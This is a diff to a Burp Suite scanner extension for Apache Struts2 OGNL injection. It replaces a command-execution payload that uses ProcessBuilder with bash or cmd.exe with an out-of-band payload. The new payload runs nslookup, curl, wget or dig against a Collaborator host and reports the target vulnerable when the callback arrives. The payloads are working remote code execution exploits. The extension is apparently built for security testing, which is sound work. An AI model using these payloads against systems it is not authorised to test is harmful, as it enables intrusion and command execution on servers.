@@ -4,13 +4,12 @@ from burp import IScanIssue
 from array import array
 from burp import IBurpCollaboratorClientContext
 
-GREP_STRING = "could not connect over HTTP to server"
-GREP_STRING_BYTES = bytearray(GREP_STRING)
-INJ_TEST = bytearray("http://127.0.0.1:33")
-INJ_ERROR = "could not connect over HTTP to server"
-INJ_ERROR_BYTES = bytearray(INJ_ERROR)
-CMD='''%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='MY_CMD_HERE').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
+
+CMD='''%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"OOB_CMD","ATTACKER_DOMAIN"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
 '''
+
+OBB_CMD_LISTS = ['nslookup', 'curl', 'wget', "dig"]
+
 class BurpExtender(IBurpExtender, IScannerCheck):
 
     #
@@ -25,7 +24,7 @@ class BurpExtender(IBurpExtender, IScannerCheck):
         self._helpers = callbacks.getHelpers()
 
         # set our extension name
-        callbacks.setExtensionName("Apache Struts2 S2-053 RCE")
+        callbacks.setExtensionName("Apache Struts2 S2-001 RCE (OOB)")
 
         # register ourselves as a custom scanner check
         callbacks.registerScannerCheck(self)
@@ -56,36 +55,44 @@ class BurpExtender(IBurpExtender, IScannerCheck):
 
 
     def doActiveScan(self, baseRequestResponse, insertionPoint):
-
+        all_issues = []
         #generate payload
-        collaboratorContext = self._callbacks.createBurpCollaboratorClientContext()
-        urlDnsCollaboratorUrl = collaboratorContext.generatePayload(True)
-        curl_cmd = 'curl ' + urlDnsCollaboratorUrl
-        payload_string = CMD.replace('MY_CMD_HERE', curl_cmd)
-        print(payload_string)
-        #INJ_CMD = bytearray(payload_string,'ascii')
-        INJ_CMD=self._helpers.stringToBytes(payload_string)
-        # make a request containing our injection test in the insertion point
-        checkRequest = insertionPoint.buildRequest(INJ_CMD)
-        #checkRequest = buildUnencodedRequest(insertionPoint,INJ_CMD)
-        checkRequestResponse = self._callbacks.makeHttpRequest(
-                baseRequestResponse.getHttpService(), checkRequest)
+        for c in OBB_CMD_LISTS:
 
-        if not collaboratorContext.fetchCollaboratorInteractionsFor(urlDnsCollaboratorUrl) :
+            collaboratorContext = self._callbacks.createBurpCollaboratorClientContext()
+            urlDnsCollaboratorUrl = collaboratorContext.generatePayload(True)
+        
+            payload_string = CMD.replace('OOB_CMD', c).replace('ATTACKER_DOMAIN',urlDnsCollaboratorUrl)
+
+            #print(payload_string)
+            #INJ_CMD = bytearray(payload_string,'ascii')
+            INJ_CMD=self._helpers.stringToBytes(payload_string)
+            # make a request containing our injection test in the insertion point
+            checkRequest = insertionPoint.buildRequest(INJ_CMD)
+            #checkRequest = buildUnencodedRequest(insertionPoint,INJ_CMD)
+            checkRequestResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), checkRequest)
+
+            if not collaboratorContext.fetchCollaboratorInteractionsFor(urlDnsCollaboratorUrl) :
+                continue
+            else:   
+                #print(collaboratorContext.fetchCollaboratorInteractionsFor(urlDnsCollaboratorUrl))
+                # get the offsets of the payload within the request, for in-UI highlighting
+                requestHighlights = [insertionPoint.getPayloadOffsets(INJ_CMD)]
+
+                # report the issue
+                new_issue = CustomScanIssue(
+                    baseRequestResponse.getHttpService(),
+                    self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
+                    [self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, None)],
+                    "Apache struts2 OGNL Injection (OOB)",
+                    "Receive connection to collaborator",
+                    "High")
+                all_issues.append(new_issue)
+
+        if not all_issues:
             return None
-        #print(collaboratorContext.fetchCollaboratorInteractionsFor(urlDnsCollaboratorUrl))
-        # get the offsets of the payload within the request, for in-UI highlighting
-        requestHighlights = [insertionPoint.getPayloadOffsets(INJ_CMD)]
-
-        # report the issue
-        return [CustomScanIssue(
-            baseRequestResponse.getHttpService(),
-            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
-            [self._callbacks.applyMarkers(checkRequestResponse, requestHighlights, None)],
-            "RCE S2-053",
-            "Receive connection to collaborator",
-            "High")]
-
+        else:
+            return all_issues
     def consolidateDuplicateIssues(self, existingIssue, newIssue):
         # This method is called when multiple issues are reported for the same URL 
         # path by the same extension-provided check. The value we return from this 
